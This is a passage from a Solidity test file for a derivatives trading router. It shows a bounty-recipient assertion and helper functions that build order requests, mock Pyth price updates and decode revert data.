            assertEq(receipt.bountyRecipient, account, "self-execution releases the bounty to its source");
            assertEq(
                uint8(receipt.bountyDisposition),
                uint8(OrderV3Types.BountyDisposition.Paid),
                "the self-executor is recorded as bounty recipient"
            );
        }
    }

    function _request(
        bytes32 clientOrderId,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 targetPrice,
        uint256 minPositionEquity
    ) private view returns (OrderV3Types.OrderRequest memory request) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        request.clientOrderId = clientOrderId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = targetPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: window,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: minPositionEquity,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _priceUpdate(
        uint256 price,
        uint64 publishTime,
        uint64 prevPublishTime
    ) private view returns (bytes[] memory updateData) {
        bytes32[] memory feedIds = _basePythFeedIds();
        MockFeedUpdate[] memory updates = new MockFeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockFeedUpdate({
                id: feedIds[i],
                price: MockPrice({
                    price: int64(uint64(price)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: prevPublishTime
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _accountWealth(
        address account
    ) private view returns (uint256) {
        return clearinghouse.balanceAssets(account) + engine.traderClaimBalanceAssets(account);
    }

    function _selector(
        bytes memory revertData
    ) private pure returns (bytes4 selector) {
        if (revertData.length < 4) return bytes4(0);
        assembly ("memory-safe") {
            selector := mload(add(revertData, 32))
        }
    }

    function _errorArguments(
        bytes memory revertData
    ) private pure returns (bytes memory arguments) {
        arguments = new bytes(revertData.length - 4);
        for (uint256 i; i < arguments.length; ++i) {
            arguments[i] = revertData[i + 4];
        }
    }

}

```
